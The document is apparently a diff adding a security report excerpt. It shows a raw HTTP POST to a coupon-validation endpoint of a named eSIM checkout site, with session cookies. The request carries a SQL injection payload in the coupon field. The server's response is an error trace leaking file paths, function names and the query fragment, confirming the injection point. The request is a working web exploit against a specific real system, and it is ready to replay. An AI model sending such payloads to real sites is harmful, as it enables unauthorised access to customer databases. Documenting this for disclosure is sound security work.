@@ -1,0 +1,44 @@
+Send Raw Request
+-----------------
+
+POST /en/ajax/validate-coupon/ HTTP/2
+Host: esim.orange-zen.simoptions.com
+Cookie: _gcl_au=1.1.650235044.1661492275; _ga=GA1.2.1512076791.1661492700; _fbp=fb.1.1661492702860.773648615; __zlcmid=1BelB9MowssobmA; PHPSESSID=d3567786b986b00f75005f37c87016e1; _gid=GA1.2.365011067.1663142325; _gat_UA-59223616-3=1
+Content-Length: 34
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://esim.orange-zen.simoptions.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://esim.orange-zen.simoptions.com/checkout/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+
+coupon={base}' or username like '%
+
+Response
+
+.
+.
+
+
+<br />
+<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'USERNAME' in 'where clause' in /home/customer/www/partners-engine.simoptions.com/public_html/lib/functions.php:879
+Stack trace:
+#0 /home/customer/www/partners-engine.simoptions.com/public_html/lib/functions.php(879): PDO-&gt;prepare('SELECT * FROM `...')
+#1 /home/customer/www/partners-engine.simoptions.com/public_html/lib/functions.ajax.php(246): coupon_voucher_check('{base}' or user...')
+#2 /home/customer/www/partners-engine.simoptions.com/public_html/controller.php(95): ajax_coupon_voucher('{base}' or user...')
+#3 /home/customer/www/esim.orange-zen.simoptions.com/public_html/controller.php(20): include('/home/customer/...')
+#4 {main}
+  thrown in <b>/home/customer/www/partners-engine.simoptions.com/public_html/lib/functions.php</b> on line <b>879</b><br />
+.
+.
+.
+
